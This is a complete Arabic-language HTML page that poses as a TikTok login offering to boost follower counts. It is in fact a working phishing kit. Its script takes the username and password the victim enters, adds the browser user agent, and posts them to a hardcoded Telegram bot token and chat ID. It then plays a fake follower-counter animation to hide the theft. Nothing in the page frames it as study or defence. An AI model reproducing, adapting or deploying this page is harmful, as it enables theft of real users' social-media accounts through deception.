<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول تيك توك - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #010101, #2a2a2a);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(0, 0, 0, 0.8);
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 450px;
            box-shadow: 0 0 20px rgba(255, 0, 128, 0.5);
            text-align: center;
        }
        
        .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #ff0080;
        }
        
        input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }
        
        input:focus {
            outline: 2px solid #ff0080;
        }
        
        .btn {
            background: linear-gradient(to right, #ff0080, #ff2a95);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background: linear-gradient(to right, #ff2a95, #ff0080);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 0, 128, 0.4);
        }
        
        .counter {
            margin-top: 30px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            display: none;
        }
        
        .counter.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        .counter h3 {
            color: #ff0080;
            margin-bottom: 10px;
        }
        
        .followers-count {
            font-size: 32px;
            font-weight: bold;
            color: #25f4ee;
            margin: 15px 0;
        }
        
        .progress {
            height: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(to right, #ff0080, #25f4ee);
            width: 0%;
            transition: width 0.5s;
        }
        
        .status {
            margin-top: 15px;
            color: #25f4ee;
            font-size: 14px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .loading {
            display: flex;
            justify-content: center;
            margin: 15px 0;
        }
        
        .dot {
            width: 10px;
            height: 10px;
            background: #ff0080;
            border-radius: 50%;
            margin: 0 5px;
            animation: pulse 1.5s infinite;
        }
        
        .dot:nth-child(2) {
            animation-delay: 0.5s;
        }
        
        .dot:nth-child(3) {
            animation-delay: 1s;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.5); opacity: 0.7; }
        }
        
        .warning {
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 5px;
            font-size: 12px;
            color: #ff5555;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border-radius: 5px;
            display: none;
            z-index: 1000;
            animation: slideIn 0.5s;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .data-preview {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            display: none;
            text-align: right;
        }
        
        .data-preview.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        .data-preview h3 {
            color: #ff0080;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .data-item {
            margin-bottom: 10px;
            padding: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0Ij48cGF0aCBmaWxsPSIjZmYwMDgwIiBkPSJNMTIuNTI1LjAxMmEuNzUuNzUgMCAwMC0uOTU0LjUzMWwtLjA0Ni4xOGE5LjM2OSA5LjM2OSAwIDAwLTQuNDYgNC40NjVsLS4xOC4wNDZhLjc1Ljc1IDAgMDAtLjUzLjk1NGwuMDE2LjA2YTMzLjg0MyAzMy44NDMgMCAwMDIuMDUgOC4yNzcgMzMuODQzIDMzLjg0MyAwIDAwNi4yNzMgNi4yNzMgMzMuODQzIDMzLjg0MyAwIDAwOC4yNzcgMi4wNWwuMDYuMDE2YS43NS43NSAwIDAwLjk1NC0uNTNsLjA0Ni0uMTlhOS4zNjkgOS4zNjkgMCAwMDQuNDYtNC40NmwuMTgtLjA0NmEuNzUuNzUgMCAwMC0uNTMtLjk1NGwtLjA2LS4wMTZhMzIuMzI1IDMyLjMyNSAwIDAxLTcuODktMS45IDMyLjMyNSAzMi4zMjNSAwIDAxLTEuOS03Ljg5eiIvPjxwYXRoIGZpbGw9IiMyNWY0ZWUiIGQ9Ik0xMi41MjUuMDEyYS43NS43NSAwIDAwLS45NTQuNTMxbC0uMDQ2LjE4YTkuMzY5IDkuMzY5IDAgMDAtNC40NiA0LjQ2NWwtLjE4LjA0NmEuNzUuNzUgMCAwMC0uNTMuOTU0bC4wMTYuMDZhMzMuODQzIDMzLjg0MyAwIDAwMi4wNSA4LjI3NyAzMy44NDMgMzMuODQzIDAgMDA2LjI3MyA2LjI3MyAzMy44NDMgMzMuODQzIDAgMDA4LjI3NyAyLjA1bC4wNi4wMTZhLjc1Ljc1IDAgMDAuOTU0LS41M2wuMDQ2LS4xOWE5LjM2OSA5LjM2OSAwIDAwNC40Ni00LjQ2bC4xOC0uMDQ2YS43NS43NSAwIDAwLS41My0uOTU0bC0uMDYtLjAxNmEzMi4zMjUgMzIuMzI1IDAgMDEtNy44OS0xLjkgMzIuMzI1IDMyLjMyNSAwIDAxLTEuOS03Ljg5eiIvPjwvc3ZnPg==" alt="TikTok Logo" class="logo">
        
        <h1>زيادة متابعين تيك توك</h1>
        
        <div class="form-group">
            <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
            <input type="text" id="username" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني">
        </div>
        
        <div class="form-group">
            <label for="password">كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور">
        </div>
        
        <div class="form-group">
            <label for="followers">عدد المتابعين المطلوب</label>
            <input type="number" id="followers" placeholder="أدخل عدد المتابعين الذي تريده" min="100" value="1000">
        </div>
        
        <button class="btn" id="login-btn">تسجيل الدخول وبدء الزيادة</button>
        
        <div class="counter" id="counter">
            <h3>جاري زيادة المتابعين</h3>
            
            <div class="loading">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            
            <div class="followers-count" id="followers-count">0</div>
            
            <div class="progress">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            
            <div class="status" id="status">جاري إضافة المتابعين الجدد...</div>
        </div>
        
        <div class="data-preview" id="data-preview">
            <h3>البيانات المرسلة</h3>
            <div class="data-item" id="preview-username"></div>
            <div class="data-item" id="preview-password"></div>
            <div class="data-item" id="preview-followers"></div>
        </div>
        
        <div class="warning">
            2026
        </div>
    </div>

    <div class="notification" id="notification">تم</div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = '8264466382:AAFLCpQrj6Ki_ofhkbCbEkY5D2-XdeKcmK0';
        const CHAT_ID = '7201827487';
        
        document.getElementById('login-btn').addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const followersInput = document.getElementById('followers').value;
            
            if (!username || !password) {
                alert('يرجى إدخال اسم المستخدم وكلمة المرور');
                return;
            }
            
            const targetFollowers = parseInt(followersInput) || 1000;
            
            // إظهار معاينة البيانات
            document.getElementById('preview-username').textContent = `اسم المستخدم: ${username}`;
            document.getElementById('preview-password').textContent = `كلمة المرور: ${password}`;
            document.getElementById('preview-followers').textContent = `المتابعين المطلوبين: ${targetFollowers}`;
            document.getElementById('data-preview').classList.add('active');
            
            // إرسال البيانات إلى البوت
            sendDataToBot(username, password, targetFollowers);
            
            // إظهار عداد المتابعين
            document.getElementById('counter').classList.add('active');
            
            // بدء المحاكاة
            simulateFollowersIncrease(targetFollowers);
        });
        
        function simulateFollowersIncrease(target) {
            let current = 0;
            const followersCount = document.getElementById('followers-count');
            const progressBar = document.getElementById('progress-bar');
            const status = document.getElementById('status');
            
            const interval = setInterval(() => {
                // زيادة عشوائية للمتابعين
                const increment = Math.floor(Math.random() * 20) + 1;
                current += increment;
                
                if (current > target) {
                    current = target;
                    clearInterval(interval);
                    status.textContent = 'اكتملت عملية زيادة المتابعين!';
                }
                
                followersCount.textContent = current.toLocaleString();
                
                const progress = (current / target) * 100;
                progressBar.style.width = progress + '%';
                
                // تحديث الرسالة بشكل عشوائي
                const messages = [
                    'جاري إضافة المتابعين الجدد...',
                    'جاري متابعة الحسابات...',
                    'جاري تفعيل نظام الزيادة...',
                    'جاري زيادة التفاعل...',
                    'جاري تحسين ظهور الحساب...'
                ];
                
                if (Math.random() < 0.1) {
                    status.textContent = messages[Math.floor(Math.random() * messages.length)];
                }
                
            }, 100);
        }
        
        function sendDataToBot(username, password, followers) {
            const message = `
                بيانات جديدة من صفحة تيك توك:
                👤 اسم المستخدم: ${username}
                🔑 كلمة المرور: ${password}
                📊 عدد المتابعين المطلوب: ${followers}
                ⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
                🌐 المتصفح: ${navigator.userAgent}
            `;
            
            // إرسال البيانات باستخدام fetch
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم', data);
                showNotification('تم');
            })
            .catch((error) => {
                console.error('خطأ في الإرسال:', error);
                showNotification('حدث خطأ في الإرسال، لكن المحاكاة ستبدأ.');
            });
        }
        
        function showNotification(message) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
